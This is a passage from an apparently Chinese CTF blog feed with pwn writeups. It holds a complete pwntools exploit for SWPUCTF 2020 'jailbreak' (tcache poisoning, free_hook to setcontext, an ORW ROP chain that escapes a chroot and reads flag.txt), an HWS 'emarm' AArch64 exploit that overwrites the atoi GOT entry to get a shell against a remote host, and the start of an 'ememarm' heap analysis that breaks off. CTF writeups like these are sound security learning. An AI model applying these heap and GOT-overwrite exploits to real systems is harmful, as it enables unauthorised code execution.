href="https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#jailbreak">https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#jailbreak</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>], arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./jailbreak&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./jailbreak&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> sh.send(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">delim, data</span>):</span> <span class="keyword">return</span> sh.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> sh.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">delim, data</span>):</span> <span class="keyword">return</span> sh.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span>(<span class="params">numb=<span class="number">4096</span></span>):</span> <span class="keyword">return</span> sh.recv(numb)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delims, drop=<span class="literal">True</span></span>):</span> <span class="keyword">return</span> sh.recvuntil(delims, drop)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">irt</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu32</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu64</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru7f</span>():</span> <span class="keyword">return</span> u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruf7</span>():</span> <span class="keyword">return</span> u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> log.success(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size, description_size</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Item name size:&quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sla(<span class="string">&quot;Item description size:&quot;</span>, <span class="built_in">str</span>(description_size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, name, description</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;M&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify name?[y/N]&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;new name:&quot;</span>, <span class="built_in">str</span>(name))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify name?[y/N]&quot;</span>, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> description != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify description?[y/N]&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;new description:&quot;</span>, <span class="built_in">str</span>(description))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify description?[y/N]&quot;</span>, <span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;S&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;W&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;\xFF&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Action[y/N]&quot;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_base</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Item name: &quot;</span>)</span><br><span class="line">heap_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x280</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack money</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x13&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\x14&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x29</span>)  <span class="comment"># 0x20;0x40</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x13&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\x14&#x27;</span> * <span class="number">0x18</span> +</span><br><span class="line">     p64(<span class="number">0x21</span>) + p64(heap_base + <span class="number">0x250</span> + <span class="number">0x10</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># balance tcache number</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)  <span class="comment"># 0x20;0x20</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)  <span class="comment"># 0x20;0x20</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x15&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xcafecafe</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get fd</span></span><br><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;secret:&quot;</span>)</span><br><span class="line">dir_fd = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>).strip(), <span class="number">10</span>)</span><br><span class="line">log.info(<span class="string">&quot;dri_fd:&quot;</span>+<span class="built_in">hex</span>(dir_fd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack tache struct</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)  <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x28</span> + p8(<span class="number">0x51</span>), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x48</span>)  <span class="comment"># 0x30;0x50</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x28</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> +</span><br><span class="line">     p64(<span class="number">0x31</span>) + p64(heap_base + <span class="number">0x10</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x38</span>)  <span class="comment"># tcache struct;0x40 tbin</span></span><br><span class="line"><span class="comment"># set 0x90-&gt;8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x0800000000000000</span>) + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x15&#x27;</span> * <span class="number">0x38</span> + p8(<span class="number">0x91</span>), <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># bypass double free(!prev_inuse)</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">&#x27;\n&#x27;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)  <span class="comment"># 5</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Item idx: 5&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">main_arena = uu64(r(<span class="number">6</span>)) - <span class="number">224</span></span><br><span class="line">libc = main_arena - <span class="number">0x10</span> - lib.symbols[<span class="string">b&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">binsh = lib.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">__free_hook = lib.symbols[<span class="string">b&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">__malloc_hook = lib.symbols[<span class="string">b&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc + <span class="number">0x00000000000215bf</span><span class="comment">#0x000000000002155f</span></span><br><span class="line">pop_rsi_ret = libc + <span class="number">0x0000000000023eea</span><span class="comment">#0x0000000000023e8a</span></span><br><span class="line">pop_rdx_ret = libc + <span class="number">0x0000000000001b96</span><span class="comment">#0x0000000000001b96</span></span><br><span class="line">pop_rdx_rsi_ret = libc + <span class="number">0x0000000000130569</span><span class="comment">#0x0000000000130889</span></span><br><span class="line">ret = libc + <span class="number">0x00000000000008aa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)  <span class="comment"># 7</span></span><br><span class="line">free(<span class="number">6</span>)  <span class="comment"># ???</span></span><br><span class="line"><span class="comment"># 0x60 : tcache 0x40</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,p64(heap_base + <span class="number">0x60</span>) + <span class="string">&quot;\n&quot;</span>,<span class="string">&quot;flag.txt\x00&quot;</span>.ljust(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>) + p64(<span class="number">0x3c0</span> + heap_base) + p64(ret) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># heap_base+0x60 :tcache struct 0x40 chunk head</span></span><br><span class="line"><span class="comment"># setcontext data</span></span><br><span class="line"><span class="comment"># rsp:heap_base+0x3c0:chunk5</span></span><br><span class="line"><span class="comment"># rip:ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 8</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>, p64(lib.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># fix tcache 0x40</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x0800000000010000</span>) + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free_hook</span></span><br><span class="line">log.info(<span class="string">&quot;setcontext:&quot;</span>+<span class="built_in">hex</span>(lib.sym[<span class="string">&#x27;setcontext&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x48</span>)  <span class="comment"># 9</span></span><br><span class="line">edit(<span class="number">9</span>, p64(lib.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>) + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># creat read</span></span><br><span class="line">edit(<span class="number">5</span>, p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi_ret) + p64(<span class="number">0x1000</span>) +</span><br><span class="line">     p64(heap_base + <span class="number">0x3b0</span>) + p64(lib.sym[<span class="string">&#x27;read&#x27;</span>])+<span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x40</span>-<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(dir_fd)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;fchdir&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(heap_base+<span class="number">0x4c0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">0x440</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdx_rsi_ret) + p64(<span class="number">0x100</span>) + p64(heap_base+<span class="number">0x400</span>)</span><br><span class="line">payload += p64(lib.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(pop_rdi_ret) + p64(binsh)</span></span><br><span class="line"><span class="comment"># payload += p64(ret)</span></span><br><span class="line"><span class="comment"># payload += p64(system)</span></span><br><span class="line">sl(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># sl(&quot;echo deadbeef &amp;&amp; cd ../ &amp;&amp; cat flag.txt&quot;)</span></span><br><span class="line"><span class="comment"># ru(&quot;deadbeef&quot;)</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.eonew.cn/archives/993">setcontext 函数exploit</a></p><p><a href="https://blog.csdn.net/qq_43116977/article/details/107580414">DASCTF 7月部分pwn</a></p><p><a href="http://www.jx-zhang.xyz/2019/12/29/chroot_jail">chroot jail break in CTF from 0 to -1</a></p><p>[高校战“疫”网络安全分享赛pwn部分wp]</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沙盒 </tag>
            
            <tag> 堆溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HWS冬令营选拔赛部分Writeup</title>
      <link href="archives/222/"/>
      <url>archives/222/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="emarm"><a href="#emarm" class="headerlink" title="emarm"></a>emarm</h3><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>Aarch64 题目没有打开 pie 。程序存在一个任意地址写入：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203163021.png" alt="image-20210203163013826"></p><p>随机数验证输入 <code>\x00</code> 绕过。</p><p>远程是用 qemu 部署，地址不随机。第一次泄露地址，第二次 getshell 。</p><p>利用任意地址写，将 atoi got 改为 printf ，在 main 函数控制 atoi 参数实现格式化字符串泄露出栈上 got 表信息。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203163610.png" alt="image-20210203163610628"></p><p>第二次就讲 atoi 修改为 system 参数为 /bin/sh\x00</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.binary = <span class="string">&quot;emarm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10012</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;emarm&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;passwd:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;you will success&quot;</span>)</span><br><span class="line">p.send(p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;i leave for you bye&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;%9$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr-<span class="number">0x206e0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10012</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./emarm&quot;</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;passwd:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">p.recvuntil(<span class="string">&quot;you will success&quot;</span>)</span><br><span class="line">p.send(p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base))</span><br><span class="line">p.recvuntil(<span class="string">&quot;i leave for you bye&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>flag{33c34e317026a39feeea14fdd97fa846}</p></blockquote><h3 id="ememarm"><a href="#ememarm" class="headerlink" title="ememarm"></a>ememarm</h3><h4 id="基本情况-1"><a href="#基本情况-1" class="headerlink" title="基本情况"></a>基本情况</h4><p>Aarch64 堆题目，libc 是 2.27 ，输出功能是个摆设。能可以 malloc 0x20 ＆ 0x30 。</p><p>程序一开始 malloc 0x20 那个堆块相当于是个链头， 0x20 和 0x30 堆内结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  x;<span class="comment">//8bit</span></span><br><span class="line">  y;<span class="comment">//8bit</span></span><br><span class="line">  null;<span class="comment">//8bit</span></span><br><span class="line">  next_ptr;<span class="comment">//8bit</span></span><br><span class="line">  ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 next_ptr 是下一个堆块的地址，通过这个属性构成一个链表。malloc 堆块是否加入链表是看申请完那个 <code>do you want delete</code> 选择。</p><p>edit 的时候溢出一个 <code>\x00</code> ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210203220521.png" alt="image-20210203220521033"></p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>利用溢出，释放一个 fake_chunk 。将两个 